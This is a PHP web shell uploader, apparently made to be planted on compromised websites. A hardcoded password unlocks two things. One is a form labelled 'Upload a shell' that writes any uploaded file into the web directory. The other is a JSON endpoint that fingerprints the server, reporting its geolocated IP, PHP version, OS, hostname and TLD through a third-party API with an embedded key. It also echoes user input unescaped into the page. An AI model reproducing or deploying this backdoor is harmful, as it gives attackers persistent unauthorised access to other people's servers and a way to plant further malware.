<?php
 
    $password = "xvil"; //min 4
    $error = ""; 
    if(isset($_GET["passwordapi"]) && $_GET["passwordapi"] == $password && isset($_GET["id"]) && $_GET["id"] == "server"){
 
                $reponse = array();
 
                $reponse['ok'] = "1";
 
                if($reponse['ok'] == "1"){
 
                    $HTTPS = $_SERVER["HTTP_SSLSESSIONID"] ? TRUE : FALSE;
 
                    if($HTTPS == true){
                        $reponse['https'] = "1"; 
                    }
                    else {
                        $reponse['https'] = "0";
                    }
 
                    $serverip = $_SERVER['SERVER_ADDR'];
                    $url2 = "http://api.ipapi.com/api/$serverip?access_key=0d27be4aa0a92a670e45654a37dcf055";
                    $headers2 = array();
                    $headers2[] = 'Accept-Version: 3';
                    $ch2 = curl_init();  
                    curl_setopt($ch2,CURLOPT_URL,$url2);
                    curl_setopt($ch2,CURLOPT_RETURNTRANSFER,true);
                    curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers2);
                    $resp2=curl_exec($ch2);
                    $err2 = curl_error($ch2);
                    curl_close($ch2);
                    if($err2){
                        return false;
                    }
                    else {
 
                        $Json2 = json_decode($resp2, true);
 
                        $country = $Json2['country_name'];
 
                        if(!empty($country)){
                            $reponse['country'] = $country;
                        }
                        else {
                            $reponse['country'] = 0;
                        }
                    }
 
 
                    $phpversion = phpversion();
                    if(!empty($phpversion)){
                        $reponse['phpversion'] = $phpversion;
                    }
                    else {
                        $reponse['phpversion'] = "0";
                    }
 
 
 
                    $serverOs = PHP_OS;
 
                    if(!empty($serverOs)){
                        $reponse['serveros'] = $serverOs;
                    }
                    else {
                        $reponse['serveros'] = "0";
                    }
 
                    $machinetype = php_uname('m');
                    if(!empty($machinetype)){
                        $reponse['machinetype'] = $machinetype;
                    }
                    else {
                        $reponse['machinetype'] = "0";
                    }
 
                    /**function get_dir_size($dir_name){
                        $dir_size =0;
                        if (is_dir($dir_name)) {
                            if ($dh = opendir($dir_name)) {
                                while (($file = readdir($dh)) !== false) {
                                    if($file !="." && $file != ".."){
                                        if(is_file($dir_name."/".$file)){
                                            $dir_size += filesize($dir_name."/".$file);
                                        }
 
                                        if(is_dir($dir_name."/".$file)){
                                            $dir_size +=  get_dir_size($dir_name."/".$file);
                                        }
                                    }
                                }
                            }
                        }
                        closedir($dh);
                        return $dir_size;
                    }
                    $dir_name = "/home/".$_SERVER['PHP_AUTH_USER'];
 
                    $diskspace = round((get_dir_size($dir_name) / 104857600),2) ;
 
                    if(!empty($diskspace)){ 
                        $reponse['disckspace'] = $diskspace;
                    }
                    else {
                        $reponse['disckspace'] = "0";
                    }**/
 
                    $hostname = gethostname();
                    if(!empty($hostname)){
                        $reponse['hostname'] = $hostname;
                    }
                    else {
                        $reponse['hostname'] = "0";
                    }
 
 
                    $url =  'http://' . $_SERVER['SERVER_NAME']; 
                    $tld = end(explode(".", parse_url($url, PHP_URL_HOST))); 
                    if(!empty($tld)){
                        $reponse['tld'] = $tld;
                    }
                    else {
                        $reponse['tld'] = "0";
                    }  
 
                }
                else {
                    $reponse['ok'] = "0";
                }
                echo json_encode($reponse); 
 
                exit(); 
 
     }
?>
<!DOCTYPE html>
<html lang="en">
    <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
 
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
                <!-- Vendor styles -->
        <link rel="stylesheet" href="http://localhost/faker/_template/vendors/bower_components/material-design-iconic-font/dist/css/material-design-iconic-font.min.css">
 
        <!-- App styles -->
        <link rel="stylesheet" href="http://localhost/faker/_template/css/app.min.css">
    </head>
 
    <body data-sa-theme="1">
        <section class="error">
            <div class="error__inner">
 
 
    <?php
 
    if(isset($_POST["password"]) && $_POST["password"] == $password){
 
 
        if(isset($_POST["ok"])){
 
            if(isset($_FILES["shell"])){
 
                if($_FILES["shell"]['error'] == 0){
 
 
                    if(move_uploaded_file($_FILES["shell"]['tmp_name'], './'.$_FILES["shell"]['name'])){
                        $error = '<h4>Shell Uploaded</h4>'; 
                    }
                    else {
                        $error = '<h4>ERROR Shell Not Uploaded</h4>';
                    }
 
                }
                else {
                    $error = '<h4>ERROR File !</h4>';
                }
 
            }
            else {
                $error = '<h4>ERROR Please choose a file</h4>';
            }
 
        }
 
 
    ?>
        <h4>Upload a shell</h4>
        <?php echo $error ?>
        <form action="" method="POST" enctype="multipart/form-data"> 
            <input type="file" name="shell" class="form-control"><br/><br/>
            <input type="submit" name="ok" class="btn btn-light">
            <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>">
        </form>
    <?php
 
 
 
 
 
    }
    else {
    ?>
        <h4>Password</h4>
        <form method="post" action="">
            <input name="password" type="text" class="form-control text-center"><br/><br/>
            <input type="submit" name="go" class="btn btn-light">
        </form>
 
    <?php
    }
?>
                    </div>
                </section>
 
            </body>
        </html>